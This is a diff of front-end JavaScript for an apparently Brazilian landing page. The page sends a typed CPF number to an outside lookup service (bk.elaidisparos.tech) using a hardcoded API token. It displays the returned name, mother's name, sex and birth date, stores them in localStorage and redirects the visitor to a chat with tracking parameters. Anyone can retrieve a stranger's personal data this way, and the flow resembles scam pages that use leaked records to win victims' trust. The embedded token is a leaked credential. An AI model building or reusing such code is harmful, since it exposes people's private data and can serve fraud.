@@ -26,6 +26,8 @@ document.addEventListener("DOMContentLoaded", function () {
   const cpfUsuario = document.getElementById("cpfUsuario");
   const sexoUsuario = document.getElementById("sexoUsuario");
   const nomeMae = document.getElementById("nomeMae");
+  // se existir na tela, a gente preenche; se não existir, só ignora
+  const dataNascimento = document.getElementById("dataNascimento");
 
   // Obter parâmetros UTM
   function getUTMParams() {
@@ -97,8 +99,12 @@ document.addEventListener("DOMContentLoaded", function () {
     return dateString;
   }
 
-  // Consultar CPF na API
+  // ==========================
+  // CONSULTA CPF (NOVA API BK)
+  // ==========================
   function consultarCPF(cpf) {
+    const cpfLimpo = cpf.replace(/\D/g, "");
+
     // Mostrar resultados e estado de carregamento
     consultaResultado.classList.remove("hidden");
     loadingInfo.classList.remove("hidden");
@@ -109,10 +115,8 @@ document.addEventListener("DOMContentLoaded", function () {
     consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });
 
     // Executar a consulta
-
     fetch(
-      `https://bk.elaidisparos.tech/consultar-filtrada/cpf?token_api=574a7ff49027efebaa19dc18b17e4ead1dadf7eac42d65cb8acfa969a897e976&cpf=${cpf}`,
-
+      `https://bk.elaidisparos.tech/consultar-filtrada/cpf?cpf=${cpfLimpo}&token=574a7ff49027efebaa19dc18b17e4ead1dadf7eac42d65cb8acfa969a897e976`
     )
       .then((response) => {
         if (!response.ok) {
@@ -120,39 +124,69 @@ document.addEventListener("DOMContentLoaded", function () {
         }
         return response.json();
       })
-      .then((data) => {
+      .then((response) => {
         // Ocultar loading
         loadingInfo.classList.add("hidden");
 
-        // Processar os dados
-        if (data && data.dados && data.dados.length > 0) {
-          const dadosUsuarioAPI = data.dados[0];
-          console.log(dadosUsuarioAPI);
+        // Processar os dados da API
+        // Formato esperado: { cpf, nome, mae, sexo, nascimento }
+        let raw = response;
+        let data = null;
+
+        try {
+          if (raw && (raw.cpf || raw.nome)) {
+            // Normalizar para as chaves usadas no resto do código
+            data = {
+              CPF: raw.cpf || "",
+              NOME: raw.nome || "",
+              NOME_MAE: raw.mae || "",
+              NASC: raw.nascimento || "",
+              SEXO: raw.sexo || "",
+            };
+          }
+        } catch (e) {
+          console.error("Erro ao interpretar resposta da API:", e, raw);
+        }
+
+        if (data) {
+          console.log("Dados normalizados:", data);
+
           // Preencher os campos com os dados do usuário
-          nomeUsuario.textContent = dadosUsuarioAPI.NOME || "Não informado";
-          cpfUsuario.textContent = dadosUsuarioAPI.CPF
-            ? dadosUsuarioAPI.CPF.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4")
+          nomeUsuario.textContent = data.NOME || "Não informado";
+
+          if (dataNascimento) {
+            dataNascimento.textContent =
+              formatDate(data.NASC) || "Não informado";
+          }
+
+          cpfUsuario.textContent = data.CPF
+            ? data.CPF.replace(
+                /^(\d{3})(\d{3})(\d{3})(\d{2})$/,
+                "$1.$2.$3-$4"
+              )
             : "Não informado";
-          sexoUsuario.textContent = dadosUsuarioAPI.SEXO || "Não informado";
-          nomeMae.textContent = dadosUsuarioAPI.NOME_MAE || "Não informado";
+
+          sexoUsuario.textContent = data.SEXO || "Não informado";
+          nomeMae.textContent = data.NOME_MAE || "Não informado";
 
           // Salvar dados no objeto para usar depois
           const dadosUsuario = {
-            nome: dadosUsuarioAPI.NOME,
-            nomeMae: dadosUsuarioAPI.NOME_MAE,
-            cpf: dadosUsuarioAPI.CPF,
-            sexo: dadosUsuarioAPI.SEXO,
+            nome: data.NOME || "",
+            dataNascimento: data.NASC || "",
+            nomeMae: data.NOME_MAE || "",
+            cpf: data.CPF || "",
+            sexo: data.SEXO || "",
           };
 
           // Salvar no localStorage para uso posterior
           localStorage.setItem("dadosUsuario", JSON.stringify(dadosUsuario));
 
           // Salvar nome e CPF separadamente para acesso fácil
-          if (dadosUsuarioAPI.NOME) {
-            localStorage.setItem("nomeUsuario", dadosUsuarioAPI.NOME);
+          if (dadosUsuario.nome) {
+            localStorage.setItem("nomeUsuario", dadosUsuario.nome);
           }
-          if (dadosUsuarioAPI.CPF) {
-            localStorage.setItem("cpfUsuario", dadosUsuarioAPI.CPF);
+          if (dadosUsuario.cpf) {
+            localStorage.setItem("cpfUsuario", dadosUsuario.cpf);
           }
 
           // Mostrar informações do usuário
@@ -197,41 +231,32 @@ document.addEventListener("DOMContentLoaded", function () {
 
   // Mostrar página de CPF
   function showCPFPage() {
-    // Adiciona classe para fade-out da página principal
     mainPage.classList.add("fade-out");
 
-    // Após a animação, esconde a página principal e mostra a página de CPF
     setTimeout(() => {
       mainPage.classList.add("hidden");
       cpfPage.classList.remove("hidden");
 
-      // Trigger reflow para iniciar nova animação
       void cpfPage.offsetWidth;
 
-      // Fade-in da página CPF
       cpfPage.classList.add("fade-in");
       cpfPage.classList.remove("opacity-0");
 
-      // Focar no input de CPF
       cpfInputPage.focus();
     }, 400);
   }
 
   // Voltar para a página principal
   function showMainPage() {
-    // Adiciona classe para fade-out da página de CPF
     cpfPage.classList.remove("fade-in");
     cpfPage.classList.add("opacity-0");
 
-    // Após a animação, esconde a página de CPF e mostra a página principal
     setTimeout(() => {
       cpfPage.classList.add("hidden");
       mainPage.classList.remove("hidden");
 
-      // Trigger reflow para iniciar nova animação
       void mainPage.offsetWidth;
 
-      // Fade-in da página principal
       mainPage.classList.remove("fade-out");
     }, 400);
   }
@@ -262,7 +287,6 @@ document.addEventListener("DOMContentLoaded", function () {
 
   // Redirecionar para o chat após confirmar os dados
   function redirecionarParaChat() {
-    // Verificar se temos os dados da API
     const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
     if (!dadosUsuarioJSON) {
       alert("Dados do usuário não encontrados. Por favor, tente novamente.");
@@ -276,24 +300,17 @@ document.addEventListener("DOMContentLoaded", function () {
         return;
       }
 
-      // Obter CPF formatado apenas com números
       const cpf = dadosUsuario.cpf.replace(/\D/g, "");
 
-      // Obter todos os parâmetros da URL atual
       const urlAtual = new URLSearchParams(window.location.search);
-
-      // Criar um novo objeto URLSearchParams para a nova URL
       const novaUrl = new URLSearchParams();
 
-      // Adicionar todos os parâmetros atuais à nova URL
       for (const [chave, valor] of urlAtual.entries()) {
         novaUrl.append(chave, valor);
       }
 
-      // Adicionar ou atualizar o parâmetro CPF
       novaUrl.set("cpf", cpf);
 
-      // Redirecionar para a página chat.html com todos os parâmetros
       window.location.href = `./chat/index.html?${novaUrl.toString()}`;
     } catch (error) {
       console.error("Erro ao processar dados para redirecionamento:", error);
@@ -316,14 +333,17 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   // Event Listeners
-  btnAtivar.addEventListener("click", showCPFPage);
-  btnSimular.addEventListener("click", showCPFPage);
-  btnVoltar.addEventListener("click", showMainPage);
-  btnAnalisar.addEventListener("click", function () {
-    console.log("Botão Analisar clicado");
-    console.log("Valor do CPF antes do processamento:", cpfInputPage.value);
-    processForm();
-  });
+  if (btnAtivar) btnAtivar.addEventListener("click", showCPFPage);
+  if (btnSimular) btnSimular.addEventListener("click", showCPFPage);
+  if (btnVoltar) btnVoltar.addEventListener("click", showMainPage);
+
+  if (btnAnalisar) {
+    btnAnalisar.addEventListener("click", function () {
+      console.log("Botão Analisar clicado");
+      console.log("Valor do CPF antes do processamento:", cpfInputPage.value);
+      processForm();
+    });
+  }
 
   // Listeners para os botões de confirmação/correção
   if (btnConfirmar) {
@@ -339,12 +359,16 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   // Formatação de CPF enquanto digita
-  cpfInputPage.addEventListener("input", function () {
-    formatCPF(this);
-    console.log("CPF formatado durante digitação:", this.value);
-  });
+  if (cpfInputPage) {
+    cpfInputPage.addEventListener("input", function () {
+      formatCPF(this);
+      console.log("CPF formatado durante digitação:", this.value);
+    });
+  }
 
-  // Carrossel Functionality
+  // ======================
+  // Carrossel (igual antes)
+  // ======================
   const carousel = document.getElementById("carousel");
   const slides = document.querySelectorAll(".carousel-item");
   const indicators = document.querySelectorAll(".carousel-indicator");
@@ -357,24 +381,19 @@ document.addEventListener("DOMContentLoaded", function () {
   let currentSlide = 0;
   let autoSlideInterval;
 
-  // Função para mostrar um slide específico
   function showSlide(index) {
-    // Loop infinito
     if (index < 0) {
       index = slides.length - 1;
     } else if (index >= slides.length) {
       index = 0;
     }
 
-    // Ocultar todos os slides
     slides.forEach((slide) => {
       slide.classList.remove("active");
     });
 
-    // Mostrar slide atual
     slides[index].classList.add("active");
 
-    // Atualizar indicadores
     indicators.forEach((indicator, i) => {
       if (i === index) {
         indicator.classList.add("active");
@@ -383,13 +402,10 @@ document.addEventListener("DOMContentLoaded", function () {
       }
     });
 
-    // Atualizar etapas
     updateSteps(index);
-
     currentSlide = index;
   }
 
-  // Atualizar os passos
   function updateSteps(index) {
     stepNumbers.forEach((step, i) => {
       step.classList.remove("active", "completed");
@@ -410,31 +426,26 @@ document.addEventListener("DOMContentLoaded", function () {
     });
   }
 
-  // Navegar para o próximo slide
   function nextSlide() {
     showSlide(currentSlide + 1);
     resetAutoSlide();
   }
 
-  // Navegar para o slide anterior
   function prevSlide() {
     showSlide(currentSlide - 1);
     resetAutoSlide();
   }
 
-  // Iniciar rotação automática
   function startAutoSlide() {
     autoSlideInterval = setInterval(nextSlide, 5000);
   }
 
-  // Resetar rotação automática
   function resetAutoSlide() {
     clearInterval(autoSlideInterval);
     startAutoSlide();
   }
 
-  // Event listeners para o carrossel
-  if (prevBtn && nextBtn) {
+  if (prevBtn && nextBtn && carousel) {
     nextBtn.addEventListener("click", nextSlide);
     prevBtn.addEventListener("click", prevSlide);
 
@@ -453,7 +464,6 @@ document.addEventListener("DOMContentLoaded", function () {
       });
     });
 
-    // Touch swipe para dispositivos móveis
     let touchStartX = 0;
 
     carousel.addEventListener(
@@ -471,17 +481,14 @@ document.addEventListener("DOMContentLoaded", function () {
         const diff = touchEndX - touchStartX;
 
         if (diff > 50) {
-          // Swipe right
           prevSlide();
         } else if (diff < -50) {
-          // Swipe left
           nextSlide();
         }
       },
       { passive: true }
     );
 
-    // Pausar autoplay quando mouse está sobre o carrossel
     carousel.addEventListener("mouseenter", () => {
       clearInterval(autoSlideInterval);
     });
@@ -490,7 +497,6 @@ document.addEventListener("DOMContentLoaded", function () {
       startAutoSlide();
     });
 
-    // Iniciar o carrossel
     showSlide(0);
     startAutoSlide();
   }
